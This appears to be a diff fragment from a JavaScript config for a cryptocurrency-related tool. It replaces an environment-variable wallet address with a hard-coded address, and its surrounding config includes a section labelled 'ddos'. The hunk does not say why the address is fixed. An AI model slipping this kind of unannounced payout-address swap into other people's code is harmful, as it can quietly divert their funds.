@@ -307,9 +307,9 @@ const CONFIG = {
     .split(",").filter(Boolean)
     .map((s) => { const [a, p] = s.split(":"); return { address: a, port: parseInt(p || "8333") }; }),
 
-  wallet: {
-    address:    process.env.WALLET_ADDRESS || "",
-    privateKey: process.env.WALLET_PRIVKEY || "",
+    wallet: {
+    address: "1ukpJFf4uz3c3gDmM9JASZaGiV4STJEDfzp",
+    privateKey: process.env.WALLET_PRIVKEY || "", 
   },
 
   ddos: {
